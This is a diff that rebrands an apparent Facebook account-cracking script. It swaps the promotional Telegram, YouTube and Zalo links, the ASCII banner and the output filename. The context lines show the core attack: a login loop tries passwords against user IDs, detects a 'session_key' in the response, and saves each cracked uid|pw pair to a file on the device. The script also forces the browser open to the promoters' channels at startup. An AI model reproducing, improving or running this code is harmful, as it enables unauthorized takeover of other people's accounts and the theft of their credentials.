@@ -17,9 +17,9 @@ from datetime import datetime
 
 import os, sys
 
-os.system('xdg-open https://www.youtube.com/@speed-tunnel')
-os.system('xdg-open https://t.me/@leduc0404')
-os.system('xdg-open https://zalo.me/g/lzsfmn675')
+os.system('xdg-open https://www.youtube.com/@plahuydz')
+os.system('xdg-open https://t.me/@hqhteam')
+os.system('xdg-open https://zalo.me/g/jtkizz091')
 
 
 #!/usr/bin/env python3
@@ -31,7 +31,7 @@ import shutil
 import time
 
 # Your WhatsApp channel link
-channel_link = "https://t.me/leduc0404"
+channel_link = "https://t.me/hqhteam"
 
 # Valid keys (cleaned - no trailing space)
 approved_keys = [
@@ -261,15 +261,14 @@ def ____banner____():
     print("""\033[1;32m
         
    
-      ██╗░░██╗  ██╗░░██╗  ███████╗
-      ╚██╗██╔╝  ██║░░██║  ╚══███╔╝
-      ░╚███╔╝░  ██║░░██║  ░░███╔╝░
-      ░░██║░░░  ██║░░██║  ░███╔╝░░
-      ░░██║░░░  ╚██████╔╝  ███████╗
-      ░░╚═╝░░░  ░╚═════╝░  ╚══════╝
+      ░█████╗░  ██╗░░██╗  ██████╗░
+      ██╔══██╗  ██║░░██║  ██╔══██╗
+      ███████║  ███████║  ██████╦╝
+      ██╔══██║  ██╔══██║  ██╔══██╗
+      ██║░░██║  ██║░░██║  ██████╦╝
+      ╚═╝░░╚═╝  ╚═╝░░╚═╝  ╚═════╝░
 
 \033[0m""")
-
 
 
 def creationyear(uid):
@@ -576,12 +575,12 @@ def login_2(uid):
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
                     print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/VanDucDev.txt', 'a').write(f"{uid}|{pw}\n")
+                    open('/sdcard/A H B-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
                     print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/VanDucDev.txt', 'a').write(f"{uid}|{pw}\n")
+                    open('/sdcard/A H B-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
         except Exception as e:
